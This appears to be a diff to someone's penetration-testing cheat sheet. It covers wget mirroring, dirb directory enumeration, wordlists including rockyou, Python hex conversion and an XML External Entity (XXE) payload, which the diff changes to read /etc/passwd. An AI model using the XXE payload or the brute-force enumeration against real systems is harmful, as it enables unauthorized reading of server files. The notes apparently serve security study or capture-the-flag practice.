@@ -11,20 +11,29 @@
 ```wget -r -nH $url```
 
 
-### Wordlists
-* [SecList](https://github.com/danielmiessler/SecLists)
+## Webapps
+
+Don't forget to enumerate everything. Even the things you haven't thought of.
+
+### dirb
+* Check for cgi-bin/
+* Search for different file extensions (is there a list of common file ext for brute forcing?)
+
+
+# Wordlists
+* [SecList - Really good wordlists](https://github.com/danielmiessler/SecLists)
 * raft-large
 * rockyou
 
-## Python
+# Python
 
 ## Dealing with hex encoded strings.
 
-### Convert hex to dec, 6c = 'l'
+Convert hex to dec, 6c = 'l'
 ```dec = int("6c", 16)```
 
 ### Print that in ascii
-``` print chr(dec)```
+```print chr(dec)```
 
 ## XXE (XML External Entity)
 
@@ -33,8 +42,8 @@ Find some Rest/XML API endpoint of a webapp, using POST requests you can get it 
 <?xml version="1.0"?>
 <!DOCTYPE food [
 <!ELEMENT foo ANY>
-<!ENTITY entityex SYSTEM "file:///etc/apache2/apache2.conf">
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<abc>&entityex;</abc>
+<data>&xxe;</data>
 ```
 
